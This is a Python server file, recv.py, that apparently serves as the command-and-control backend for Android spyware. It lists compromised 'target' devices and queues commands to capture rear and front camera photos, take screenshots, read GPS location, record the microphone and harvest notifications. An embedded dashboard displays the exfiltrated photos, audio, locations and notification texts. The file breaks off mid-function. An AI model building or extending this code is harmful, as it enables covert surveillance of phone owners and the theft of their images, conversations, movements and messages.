# recv.py
import json
import mimetypes
import os
import re
import sys
import time
from datetime import datetime, timezone
from email.parser import BytesParser
from email.policy import default
from http import HTTPStatus
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from threading import Lock
from urllib.parse import parse_qs, urlparse, unquote

MAX_BODY_SIZE = 64 * 1024 * 1024
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
DEVICES_FILE = os.path.join(DATA_DIR, "devices.json")
TOKEN = os.environ.get("MON_TOKEN", "")
PORT = int(os.environ.get("MON_PORT", "8080"))

os.makedirs(DATA_DIR, exist_ok=True)

class DeviceManager:
    def __init__(self, filepath: str):
        self.filepath = filepath
        self.lock = Lock()
        self.devices = {}
        self._load()

    def _load(self):
        if os.path.exists(self.filepath):
            try:
                with open(self.filepath, "r", encoding="utf-8") as f:
                    self.devices = json.load(f)
            except Exception:
                self.devices = {}

    def _save(self):
        try:
            tmp_path = self.filepath + ".tmp"
            with open(tmp_path, "w", encoding="utf-8") as f:
                json.dump(self.devices, f, indent=2)
            os.replace(tmp_path, self.filepath)
        except Exception:
            pass

    def update_heartbeat(self, dev_id: str, model: str, battery: str, app: str, ip: str) -> list:
        now_ts = time.time()
        now_iso = datetime.now(timezone.utc).isoformat()
        with self.lock:
            if dev_id not in self.devices:
                self.devices[dev_id] = {
                    "id": dev_id,
                    "first_seen": now_iso,
                    "queue": []
                }
            dev = self.devices[dev_id]
            dev["model"] = model or dev.get("model", "Unknown")
            dev["battery"] = battery or dev.get("battery", "-1")
            dev["app"] = app or dev.get("app", "")
            dev["ip"] = ip
            dev["last_seen"] = now_iso
            dev["last_seen_ts"] = now_ts

            cmds = list(dev.get("queue", []))
            dev["queue"] = []
            self._save()
            return cmds

    def queue_command(self, target: str, cmd: str) -> list:
        targeted = []
        with self.lock:
            if target in ("all", "*", ""):
                for d_id, dev in self.devices.items():
                    if "queue" not in dev:
                        dev["queue"] = []
                    dev["queue"].append(cmd)
                    targeted.append(d_id)
            elif target in self.devices:
                if "queue" not in self.devices[target]:
                    self.devices[target]["queue"] = []
                self.devices[target]["queue"].append(cmd)
                targeted.append(target)
            else:
                self.devices[target] = {
                    "id": target,
                    "model": "Pending",
                    "battery": "-1",
                    "app": "",
                    "ip": "",
                    "first_seen": datetime.now(timezone.utc).isoformat(),
                    "last_seen": "",
                    "last_seen_ts": 0,
                    "queue": [cmd]
                }
                targeted.append(target)
            self._save()
        return targeted

    def list_devices(self) -> list:
        now_ts = time.time()
        result = []
        with self.lock:
            for d_id, dev in sorted(self.devices.items(), key=lambda x: x[1].get("last_seen_ts", 0), reverse=True):
                last_seen_ts = dev.get("last_seen_ts", 0)
                is_online = (now_ts - last_seen_ts) < 35
                result.append({
                    "id": d_id,
                    "model": dev.get("model", "Unknown"),
                    "battery": dev.get("battery", "-1"),
                    "app": dev.get("app", ""),
                    "ip": dev.get("ip", ""),
                    "first_seen": dev.get("first_seen", ""),
                    "last_seen": dev.get("last_seen", ""),
                    "last_seen_ts": last_seen_ts,
                    "online": is_online,
                    "pending_count": len(dev.get("queue", []))
                })
        return result

device_mgr = DeviceManager(DEVICES_FILE)

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VENDEROS C2 & DATA EXPLORER</title>
<style>
  :root {
    --bg: #090d16;
    --card: #121927;
    --card-hover: #182235;
    --border: #1e293b;
    --text: #f8fafc;
    --muted: #94a3b8;
    --accent: #3b82f6;
    --accent-glow: rgba(59, 130, 246, 0.35);
    --green: #10b981;
    --green-glow: rgba(16, 185, 129, 0.3);
    --red: #ef4444;
    --amber: #f59e0b;
    --purple: #8b5cf6;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    padding: 20px;
    line-height: 1.5;
  }
  .container { max-width: 1300px; margin: 0 auto; }
  header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 16px 20px;
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    margin-bottom: 20px;
    flex-wrap: wrap;
    gap: 16px;
  }
  .logo-title {
    font-size: 19px;
    font-weight: 800;
    letter-spacing: 0.5px;
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .badge-pulse {
    display: inline-block;
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 10px var(--green);
  }
  .auth-bar { display: flex; gap: 8px; align-items: center; }
  input[type="password"], input[type="text"], select {
    background: #0f172a;
    border: 1px solid var(--border);
    color: #fff;
    padding: 8px 12px;
    border-radius: 6px;
    font-size: 13px;
    outline: none;
  }
  input:focus, select:focus { border-color: var(--accent); box-shadow: 0 0 6px var(--accent-glow); }
  button {
    background: var(--accent);
    color: #fff;
    border: none;
    padding: 8px 14px;
    border-radius: 6px;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.15s ease-in-out;
  }
  button:hover { background: #2563eb; transform: translateY(-1px); }
  button:active { transform: translateY(0); }
  button.danger { background: #dc2626; }
  button.danger:hover { background: #b91c1c; }
  button.action-btn {
    background: #1e293b;
    border: 1px solid #334155;
    font-size: 12px;
    padding: 6px 10px;
    border-radius: 6px;
  }
  button.action-btn:hover { background: #334155; border-color: var(--accent); }
  button.action-btn.hot { background: #991b1b; border-color: #ef4444; color: #fff; }
  button.action-btn.hot:hover { background: #dc2626; }
  .stats-row {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 14px;
    margin-bottom: 24px;
  }
  .stat-card {
    background: var(--card);
    border: 1px solid var(--border);
    padding: 16px 20px;
    border-radius: 10px;
  }
  .stat-val { font-size: 26px; font-weight: 800; color: #fff; }
  .stat-lbl { font-size: 11px; text-transform: uppercase; color: var(--muted); font-weight: 600; margin-top: 4px; }

  /* Device Control Cards */
  .section-head {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
  }
  .section-title { font-size: 16px; font-weight: 700; color: #fff; }
  .device-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
    gap: 16px;
    margin-bottom: 30px;
  }
  .device-card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 16px;
    transition: border 0.15s;
  }
  .device-card:hover { border-color: #334155; }
  .device-top {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    margin-bottom: 12px;
    border-bottom: 1px solid var(--border);
    padding-bottom: 10px;
  }
  .device-meta { font-size: 13px; margin-bottom: 6px; display: flex; justify-content: space-between; }
  .device-meta .label { color: var(--muted); }
  .device-meta .val { font-weight: 600; }
  .app-tag {
    background: #1e1b4b;
    color: #c7d2fe;
    padding: 2px 7px;
    border-radius: 4px;
    font-size: 11px;
    font-family: monospace;
  }
  .trigger-bar {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 6px;
    margin-top: 14px;
  }
  .trigger-bar button { padding: 7px 4px; font-size: 11px; text-align: center; }

  /* Data Explorer & Tabs */
  .explorer-panel {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 20px;
  }
  .tabs-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid var(--border);
    padding-bottom: 14px;
    margin-bottom: 20px;
    flex-wrap: wrap;
    gap: 12px;
  }
  .tabs-group { display: flex; gap: 8px; flex-wrap: wrap; }
  .tab-btn {
    background: #0f172a;
    border: 1px solid var(--border);
    color: var(--muted);
    padding: 8px 16px;
    border-radius: 8px;
    font-size: 13px;
    font-weight: 600;
  }
  .tab-btn.active {
    background: var(--accent);
    color: #fff;
    border-color: var(--accent);
    box-shadow: 0 0 10px var(--accent-glow);
  }
  .tab-btn:hover:not(.active) { background: #1e293b; color: #fff; }

  /* Gallery Grid */
  .gallery-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
    gap: 16px;
  }
  .media-card {
    background: #090d16;
    border: 1px solid var(--border);
    border-radius: 8px;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    transition: transform 0.15s, border 0.15s;
  }
  .media-card:hover { transform: translateY(-3px); border-color: var(--accent); }
  .img-box {
    width: 100%;
    height: 160px;
    background: #000;
    cursor: pointer;
    overflow: hidden;
    position: relative;
  }
  .img-box img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.3s; }
  .img-box:hover img { transform: scale(1.05); }
  .media-meta { padding: 10px 12px; font-size: 12px; }
  .media-meta .title { font-weight: 700; color: #fff; margin-bottom: 2px; display: flex; justify-content: space-between; }
  .media-meta .sub { color: var(--muted); font-size: 11px; }

  /* Notifications Feed */
  .notif-list { display: flex; flex-direction: column; gap: 10px; }
  .notif-card {
    background: #0f172a;
    border: 1px solid #1e293b;
    border-left: 4px solid var(--accent);
    padding: 12px 16px;
    border-radius: 8px;
  }
  .notif-head {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 6px;
  }
  .notif-pkg {
    background: #1e293b;
    color: #93c5fd;
    font-size: 11px;
    padding: 2px 6px;
    border-radius: 4px;
    font-family: monospace;
  }
  .notif-title { font-weight: 700; color: #fff; font-size: 14px; margin-bottom: 4px; }
  .notif-body { color: #cbd5e1; font-size: 13px; white-space: pre-wrap; word-break: break-word; }

  /* Audio Feed */
  .audio-list { display: flex; flex-direction: column; gap: 12px; }
  .audio-card {
    background: #0f172a;
    border: 1px solid var(--border);
    padding: 12px 16px;
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 16px;
    flex-wrap: wrap;
  }
  audio { height: 38px; outline: none; border-radius: 6px; }

  /* Location Feed */
  .loc-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 14px; }
  .loc-card {
    background: #0f172a;
    border: 1px solid var(--border);
    border-left: 4px solid var(--green);
    padding: 14px 16px;
    border-radius: 8px;
  }

  /* Lightbox Modal */
  #lightbox {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.9);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 10000;
    padding: 20px;
    cursor: zoom-out;
  }
  #lightbox img { max-width: 95%; max-height: 90vh; border-radius: 6px; box-shadow: 0 0 30px rgba(0,0,0,0.8); }

  #toast {
    position: fixed;
    bottom: 24px;
    right: 24px;
    background: #1e293b;
    border: 1px solid #3b82f6;
    color: #fff;
    padding: 12px 20px;
    border-radius: 8px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.6);
    display: none;
    font-size: 13px;
    font-weight: 600;
    z-index: 9999;
  }
</style>
</head>
<body>
<div class="container">
  <header>
    <div class="logo-title">
      <span class="badge-pulse"></span>
      <span>VENDEROS CONTROL CENTER</span>
    </div>
    <div class="auth-bar">
      <input type="password" id="tokenInput" placeholder="Server Token (X-Token)">
      <button onclick="saveToken()">Set Token</button>
      <button class="danger" onclick="triggerDevice('all', 'all')">⚡ TRIGGER ALL DEVICES</button>
    </div>
  </header>

  <!-- Statistics -->
  <div class="stats-row">
    <div class="stat-card">
      <div class="stat-val" id="statTotal">0</div>
      <div class="stat-lbl">Perangkat Terdaftar</div>
    </div>
    <div class="stat-card">
      <div class="stat-val" id="statOnline" style="color: var(--green);">0</div>
      <div class="stat-lbl">Perangkat Online (Live)</div>
    </div>
    <div class="stat-card">
      <div class="stat-val" id="statFiles">0</div>
      <div class="stat-lbl">Total Berkas Masuk</div>
    </div>
    <div class="stat-card">
      <div class="stat-val" id="statStatus">Standby</div>
      <div class="stat-lbl">Status Jaringan</div>
    </div>
  </div>

  <!-- Device Controllers -->
  <div class="section-head">
    <div class="section-title">📱 TARGET CONNECTED DEVICES (GUI TRIGGER)</div>
    <div style="font-size: 12px; color: var(--muted);" id="lastSyncText">Syncing...</div>
  </div>
  <div class="device-grid" id="deviceGrid">
    <div style="color: var(--muted); padding: 20px;">Memuat daftar perangkat...</div>
  </div>

  <!-- Data Explorer -->
  <div class="explorer-panel">
    <div class="tabs-bar">
      <div class="tabs-group">
        <button class="tab-btn active" onclick="setTab('all', this)">🌐 Semua Data</button>
        <button class="tab-btn" onclick="setTab('cam', this)">📸 Kamera</button>
        <button class="tab-btn" onclick="setTab('scr', this)">📱 Layar (Scr)</button>
        <button class="tab-btn" onclick="setTab('mic', this)">🎙️ Audio Mic</button>
        <button class="tab-btn" onclick="setTab('loc', this)">📍 Lokasi GPS</button>
        <button class="tab-btn" onclick="setTab('notif', this)">🔔 Notifikasi</button>
      </div>
      <div style="display: flex; gap: 8px; align-items: center;">
        <select id="deviceFilter" onchange="applyFilters()">
          <option value="all">Semua Perangkat (All)</option>
        </select>
        <button class="action-btn" onclick="fetchFeed()">🔄 Refresh Feed</button>
      </div>
    </div>

    <!-- Active Tab Content Area -->
    <div id="contentArea">
      <div style="text-align: center; color: var(--muted); padding: 40px;">Memuat data exfiltrasi...</div>
    </div>
  </div>
</div>

<!-- Lightbox Modal -->
<div id="lightbox" onclick="closeLightbox()">
  <img id="lightboxImg" src="">
</div>

<div id="toast"></div>

<script>
  let authToken = localStorage.getItem('venderos_token') || '';
  if (authToken) {
    document.getElementById('tokenInput').value = authToken;
  }

  let currentTab = 'all';
  let rawFeedData = [];
  let registeredDevices = [];

  function saveToken() {
    authToken = document.getElementById('tokenInput').value.trim();
    localStorage.setItem('venderos_token', authToken);
    showToast('Token tersimpan!');
    refreshAll();
  }

  function showToast(msg) {
    const t = document.getElementById('toast');
    t.innerText = msg;
    t.style.display = 'block';
    setTimeout(() => { t.style.display = 'none'; }, 3000);
  }

  function formatAgo(sec) {
    if (sec < 60) return Math.round(sec) + 's lalu';
    if (sec < 3600) return Math.round(sec/60) + 'm lalu';
    return Math.round(sec/3600) + 'j lalu';
  }

  async function triggerDevice(devId, cmd) {
    if (!authToken) {
      alert('Masukkan Token server terlebih dahulu!');
      return;
    }
    try {
      const res = await fetch('/api/trigger', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Token': authToken
        },
        body: JSON.stringify({ device_id: devId, cmd: cmd })
      });
      const data = await res.json();
      if (res.ok) {
        showToast('Perintah [' + cmd + '] terkirim ke ' + (devId === 'all' ? 'SEMUA HP' : devId));
        refreshDevices();
      } else {
        alert('Gagal: ' + (data.error || 'Server error'));
      }
    } catch(err) {
      alert('Koneksi gagal: ' + err.message);
    }
  }

  async function refreshDevices() {
    if (!authToken) {
      document.getElementById('statStatus').innerText = 'Butuh Token';
      return;
    }
    try {
      const res = await fetch('/api/devices?token=' + encodeURIComponent(authToken));
      if (!res.ok) return;
      registeredDevices = await res.json();
      renderDeviceGrid(registeredDevices);
      updateFilterDropdown(registeredDevices);
      document.getElementById('statStatus').innerText = 'Connected';
      document.getElementById('lastSyncText').innerText = 'Update: ' + new Date().toLocaleTimeString();
    } catch(err) {
      document.getElementById('statStatus').innerText = 'Error';
    }
  }

  function updateFilterDropdown(devs) {
    const sel = document.getElementById('deviceFilter');
    const curVal = sel.value;
    let html = '<option value="all">Semua Perangkat (All)</option>';
    devs.forEach(d => {
      html += '<option value="' + d.id + '">' + (d.model || d.id) + ' (' + d.id.substring(0, 8) + ')</option>';
    });
    sel.innerHTML = html;
    if (curVal) sel.value = curVal;
  }

  function renderDeviceGrid(devs) {
    document.getElementById('statTotal').innerText = devs.length;
    const onlineCount = devs.filter(d => d.online).length;
    document.getElementById('statOnline').innerText = onlineCount;

    const grid = document.getElementById('deviceGrid');
    if (devs.length === 0) {
      grid.innerHTML = '<div style="color: var(--muted); grid-column: 1/-1; padding: 20px; background: var(--card); border-radius: 8px;">Belum ada perangkat yang terhubung ke server ini. Pastikan aplikasi Android aktif.</div>';
      return;
    }

    const now = Date.now() / 1000;
    let html = '';
    devs.forEach(d => {
      const agoSec = d.last_seen_ts ? Math.max(0, now - d.last_seen_ts) : 99999;
      const statusHtml = d.online
        ? '<span style="color:var(--green);font-weight:700;"><span class="badge-pulse"></span> Online</span>'
        : '<span style="color:#64748b;font-weight:600;">⚪ Offline (' + formatAgo(agoSec) + ')</span>';

      const bat = parseInt(d.battery);
      let batColor = 'var(--green)';
      if (bat <= 20) batColor = 'var(--red)';
      else if (bat <= 50) batColor = 'var(--amber)';
      const batStr = bat >= 0 ? '<span style="color:' + batColor + ';font-weight:700;">' + bat + '%</span>' : '-';

      const appStr = d.app ? '<span class="app-tag">' + d.app + '</span>' : '<span style="color:var(--muted);">-</span>';

      html += '<div class="device-card">' +
        '<div class="device-top">' +
          '<div>' +
            '<div style="font-size:15px;font-weight:800;color:#fff;">' + (d.model || 'Perangkat Android') + '</div>' +
            '<div style="font-size:11px;color:var(--muted);font-family:monospace;margin-top:2px;">ID: ' + d.id + '</div>' +
          '</div>' +
          '<div>' + statusHtml + '</div>' +
        '</div>' +
        '<div class="device-meta"><span class="label">Baterai:</span><span class="val">' + batStr + '</span></div>' +
        '<div class="device-meta"><span class="label">Aplikasi Aktif:</span><span class="val">' + appStr + '</span></div>' +
        '<div class="device-meta"><span class="label">IP Jaringan:</span><span class="val" style="font-family:monospace;font-size:12px;">' + (d.ip || '-') + '</span></div>' +
        '<div class="device-meta"><span class="label">Antrean Perintah:</span><span class="val">' + (d.pending_count > 0 ? '<span style="color:var(--amber);">' + d.pending_count + ' pending</span>' : 'Siap') + '</span></div>' +
        '<div class="trigger-bar">' +
          '<button class="action-btn hot" onclick="triggerDevice(\\'' + d.id + '\\', \\'all\\')">⚡ ALL</button>' +
          '<button class="action-btn" onclick="triggerDevice(\\'' + d.id + '\\', \\'cam\\')">📸 Kamera Belakang</button>' +
          '<button class="action-btn" onclick="triggerDevice(\\'' + d.id + '\\', \\'camfront\\')">🤳 Kamera Depan</button>' +
          '<button class="action-btn" onclick="triggerDevice(\\'' + d.id + '\\', \\'scr\\')">📱 Screenshot</button>' +
          '<button class="action-btn" onclick="triggerDevice(\\'' + d.id + '\\', \\'loc\\')">📍 GPS Lokasi</button>' +
          '<button class="action-btn" onclick="triggerDevice(\\'' + d.id + '\\', \\'mic\\')">🎙️ Mic (20s)</button>' +
          '<button class="action-btn" onclick="triggerDevice(\\'' + d.id + '\\', \\'mic:60\\')">🎙️ Mic (60s)</button>' +
          '<button class="action-btn" onclick="triggerDevice(\\'' + d.id + '\\', \\'notif\\')">🔔 Notifikasi</button>' +
        '</div>' +
      '</div>';
    });
    grid.innerHTML = html;
  }

  async function fetchFeed() {
    if (!authToken) return;
    try {
      const res = await fetch('/api/feed?token=' + encodeURIComponent(authToken));
      if (!res.ok) return;
      rawFeedData = await res.json();
      document.getElementById('statFiles').innerText = rawFeedData.length;
      renderCurrentTab();
    } catch(err) {}
  }

  function setTab(tab, el) {
    currentTab = tab;
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    el.classList.add('active');
    renderCurrentTab();
  }

  function applyFilters() {
    renderCurrentTab();
  }

  function renderCurrentTab() {
    const devFilter = document.getElementById('deviceFilter').value;
    let list = rawFeedData;
    if (devFilter !== 'all') {
      list = list.filter(item => item.dev === devFilter);
    }
    if (currentTab !== 'all') {
      if (currentTab === 'cam') {
        list = list.filter(item => item.kind === 'cam' || item.kind === 'camfront');
      } else {
        list = list.filter(item => item.kind === currentTab);
      }
    }

    const area = document.getElementById('contentArea');
    if (list.length === 0) {
      area.innerHTML = '<div style="text-align: center; color: var(--muted); padding: 50px;">Tidak ada berkas yang cocok dengan filter ini.</div>';
      return;
    }

    if (currentTab === 'cam' || currentTab === 'scr') {
      renderGalleryView(list, area);
    } else if (currentTab === 'notif') {
      renderNotifView(list, area);
    } else if (currentTab === 'mic') {
      renderAudioView(list, area);
    } else if (currentTab === 'loc') {
      renderLocationView(list, area);
    } else {
      renderMixedView(list, area);
    }
  }

  function renderGalleryView(list, container) {
    let html = '<div class="gallery-grid">';
    list.forEach(item => {
      const fileUrl = '/files/' + encodeURIComponent(item.rel_path) + '?token=' + encodeURIComponent(authToken);
      const isFront = item.kind === 'camfront';
      const label = item.kind === 'scr' ? '📱 Screenshot' : (isFront ? '🤳 Kamera Depan' : '📸 Kamera Belakang');
      html += '<div class="media-card">' +
        '<div class="img-box" onclick="openLightbox(\\'' + fileUrl + '\\')">' +
          '<img src="' + fileUrl + '" loading="lazy" alt="capture">' +
        '</div>' +
        '<div class="media-meta">' +
          '<div class="title"><span>' + label + '</span><span>' + Math.round(item.size/1024) + ' KB</span></div>' +
          '<div class="sub">HP: ' + item.dev.substring(0, 10) + ' · ' + item.ts.replace('T', ' ').substring(0, 19) + '</div>' +
          '<div style="margin-top:6px;"><a href="' + fileUrl + '" download class="action-btn" style="text-decoration:none;display:inline-block;padding:3px 8px;font-size:11px;">💾 Unduh</a></div>' +
        '</div>' +
      '</div>';
    });
    html += '</div>';
    container.innerHTML = html;
  }

  function renderNotifView(list, container) {
    let html = '<div class="notif-list">';
    list.forEach(item => {
      const parsed = item.parsed_notif || [];
      const timeStr = item.ts.replace('T', ' ').substring(0, 19);
      if (parsed.length === 0) {
        html += '<div class="notif-card"><div class="notif-title">Log Notifikasi Kosong / Raw</div><div class="notif-body">' + item.rel_path + '</div></div>';
      } else {
        parsed.forEach(n => {
          html += '<div class="notif-card">' +
            '<div class="notif-head">' +
              '<span class="notif-pkg">' + (n.pkg || 'Android') + '</span>' +
              '<span style="font-size:11px;color:var(--muted);">' + (n.ts ? new Date(n.ts).toLocaleTimeString() : timeStr) + ' · HP: ' + item.dev.substring(0, 8) + '</span>' +
            '</div>' +
            '<div class="notif-title">' + (n.title || '(Tanpa Judul)') + '</div>' +
            '<div class="notif-body">' + escapeHtml(n.text || '') + '</div>' +
          '</div>';
        });
      }
    });
    html += '</div>';
    container.innerHTML = html;
  }

  function renderAudioView(list, container) {
    let html = '<div class="audio-list">';
    list.forEach(item => {
      const fileUrl = '/files/' + encodeURIComponent(item.rel_path) + '?token=' + encodeURIComponent(authToken);
      html += '<div class="audio-card">' +
        '<div>' +
          '<div style="font-weight:700;color:#fff;font-size:14px;margin-bottom:2px;">🎙️ Rekaman Mikrofon (' + Math.round(item.size/1024) + ' KB)</div>' +
          '<div style="font-size:12px;color:var(--muted);">' + item.ts.replace('T', ' ').substring(0, 19) + ' · Target: <code>' + item.dev + '</code></div>' +
        '</div>' +
        '<audio controls src="' + fileUrl + '" preload="none"></audio>' +
        '<a href="' + fileUrl + '" download class="action-btn" style="text-decoration:none;padding:8px 12px;">💾 Download M4A</a>' +
      '</div>';
    });
    html += '</div>';
    container.innerHTML = html;
  }

  function renderLocationView(list, container) {
    let html = '<div class="loc-list">';
    list.forEach(item => {
      const loc = item.parsed_loc || {};
      const lat = loc.lat || '0.0';
      const lon = loc.lon || '0.0';
      const acc = loc.accuracy || '0';
      const hasCoord = lat !== '0.0' && lat !== '0';
      const mapUrl = 'https://www.google.com/maps?q=' + encodeURIComponent(lat + ',' + lon);

      html += '<div class="loc-card">' +
        '<div style="font-weight:700;font-size:14px;margin-bottom:6px;color:#fff;">📍 Koordinat GPS Target</div>' +
        '<div style="font-size:13px;margin-bottom:4px;"><span style="color:var(--muted);">Latitude:</span> <b>' + lat + '</b></div>' +
        '<div style="font-size:13px;margin-bottom:4px;"><span style="color:var(--muted);">Longitude:</span> <b>' + lon + '</b></div>' +
        '<div style="font-size:12px;color:var(--muted);margin-bottom:10px;">Akurasi: ' + acc + 'm · ' + item.ts.replace('T', ' ').substring(0, 19) + '</div>' +
        (hasCoord ? '<a href="' + mapUrl + '" target="_blank" class="action-btn" style="display:inline-block;text-decoration:none;background:#059669;color:#fff;">🗺️ Buka di Google Maps</a>'
                 : '<span style="font-size:11px;color:var(--amber);">Status: GPS belum lock (Unavailable)</span>') +
      '</div>';
    });
    html += '</div>';
    container.innerHTML = html;
  }

  function renderMixedView(list, container) {
    let html = '<div style="display:flex;flex-direction:column;gap:12px;">';
    list.forEach(item => {
      const fileUrl = '/files/' + encodeURIComponent(item.rel_path) + '?token=' + encodeURIComponent(authToken);
      const isImg = item.kind === 'cam' || item.kind === 'camfront' || item.kind === 'scr';
      const isAudio = item.kind === 'mic';
      const isLoc = item.kind === 'loc';
      const isNotif = item.kind === 'notif';

      html += '<div style="background:#0f172a;border:1px solid var(--border);border-radius:8px;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;">' +
        '<div style="display:flex;align-items:center;gap:12px;">' +
          (isImg ? '<img src="' + fileUrl + '" style="width:48px;height:48px;object-fit:cover;border-radius:6px;cursor:pointer;" onclick="openLightbox(\\'' + fileUrl + '\\')">' : '<div style="width:48px;height:48px;background:#1e293b;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:20px;">📁</div>') +
          '<div>' +
            '<div style="font-weight:700;color:#fff;font-size:13px;">[' + item.kind.toUpperCase() + '] ' + item.rel_path.split('/').pop() + '</div>' +
            '<div style="font-size:11px;color:var(--muted);">Target: ' + item.dev.substring(0, 10) + ' · ' + Math.round(item.size/1024) + ' KB · ' + item.ts.replace('T', ' ').substring(0, 19) + '</div>' +
          '</div>' +
        '</div>' +
        '<div style="display:flex;gap:8px;align-items:center;">' +
          (isAudio ? '<audio controls src="' + fileUrl + '" preload="none" style="height:32px;"></audio>' : '') +
          (isLoc && item.parsed_loc ? '<a href="https://www.google.com/maps?q=' + item.parsed_loc.lat + ',' + item.parsed_loc.lon + '" target="_blank" class="action-btn" style="text-decoration:none;background:#059669;color:#fff;">🗺️ Maps</a>' : '') +
          '<a href="' + fileUrl + '" target="_blank" class="action-btn" style="text-decoration:none;">Buka Berkas</a>' +
        '</div>' +
      '</div>';
    });
    html += '</div>';
    container.innerHTML = html;
  }

  function escapeHtml(str) {
    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }

  function openLightbox(url) {
    document.getElementById('lightboxImg').src = url;
    document.getElementById('lightbox').style.display = 'flex';
  }

  function closeLightbox() {
    document.getElementById('lightbox').style.display = 'none';
  }

  function refreshAll() {
    refreshDevices();
    fetchFeed();
  }

  refreshAll();
  setInterval(refreshDevices, 3000);
  setInterval(fetchFeed, 6000);
</script>
</body>
</html>
"""

class ReceiverHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        sys.stderr.write("%s - - [%s] %s\n" % (self.address_string(), self.log_date_time_string(), format % args))
        sys.stderr.flush()

    def get_client_ip(self) -> str:
        xff = self.headers.get("X-Forwarded-For")
        if xff:
            return xff.split(",")[0].strip()
        return self.client_address[0]

    def check_auth(self) -> bool:
        if not TOKEN:
            return True
        header_tok = self.headers.get("X-Token", "")
        if header_tok == TOKEN:
            return True
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)
        param_tok = qs.get("token", [""])[0]
        return param_tok == TOKEN

    def send_resp(self, status: int, body: bytes, content_type: str = "text/plain"):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/health":
            self.send_resp(HTTPStatus.OK, b"ok\n")
            return

        if path in ("/", "/dashboard"):
            self.send_resp(HTTPStatus.OK, DASHBOARD_HTML.encode("utf-8"), "text/html; charset=utf-8")
            return

        if path == "/api/devices":
            if not self.check_auth():
                self.send_resp(HTTPStatus.UNAUTHORIZED, b'{"error":"unauthorized"}', "application/json")
                return
            devs = device_mgr.list_devices()
            self.send_resp(HTTPStatus.OK, json.dumps(devs).encode("utf-8"), "application/json")
            return

        if path == "/api/feed":
            if not self.check_auth():
                self.send_resp(HTTPStatus.UNAUTHORIZED, b'{"error":"unauthorized"}', "application/json")
                return
            index_file = os.path.join(DATA_DIR, "index.log")
            feed = []
            if os.path.exists(index_file):
                try:
                    with open(index_file, "r", encoding="utf-8") as f:
                        lines = f.readlines()
                    for line in reversed(lines[-60:]):
                        parts = line.strip().split("\t")
                        if len(parts) >= 4:
                            if len(parts) == 4:
                                ts_val, kind_val, sz_val, rel_val = parts
                                dev_val = "legacy"
                            else:
                                ts_val, dev_val, kind_val, sz_val, rel_val = parts[:5]

                            entry = {
                                "ts": ts_val,
                                "dev": dev_val,
                                "kind": kind_val,
                                "size": int(sz_val),
                                "rel_path": rel_val
                            }

                            full_file = os.path.join(BASE_DIR, rel_val)
                            if kind_val == "loc" and os.path.exists(full_file):
                                loc_data = {}
                                try:
                                    with open(full_file, "r", encoding="utf-8") as lf:
                                        for loc_line in lf:
                                            if "=" in loc_line:
                                                k, v = loc_line.strip().split("=", 1)
                                                loc_data[k] = v
                                    entry["parsed_loc"] = loc_data
                                except Exception:
                                    pass

                            elif kind_val == "notif" and os.path.exists(full_file):
                                notifs = []
                                try:
                                    with open(full_file, "r", encoding="utf-8") as nf:
                                        for n_line in nf:
                                            if n_line.strip():
                                                notifs.append(json.loads(n_line.strip()))
                                    entry["parsed_notif"] = notifs
                                except Exception:
                                    pass

                            feed.append(entry)
                except Exception:
                    pass
            self.send_resp(HTTPStatus.OK, json.dumps(feed).encode("utf-8"), "application/json")
            return

        if path.startswith("/files/"):
            if not self.check_auth():
                self.send_resp(HTTPStatus.UNAUTHORIZED, b"unauthorized\n")
                return
            rel = path[len("/files/"):]
            rel = unquote(rel)
            full_path = os.path.normpath(os.path.join(BASE_DIR, rel))
            if not full_path.startswith(DATA_DIR) or not os.path.isfile(full_path):
                self.send_resp(HTTPStatus.NOT_FOUND, b"file not found\n")
                return
            ctype, _ = mimetypes.guess_type(full_path)
            try:
                with open(full_path, "rb") as f:
                    content = f.read()
                self.send_resp(HTTPStatus.OK, content, ctype or "application/octet-stream")
            except Exception:
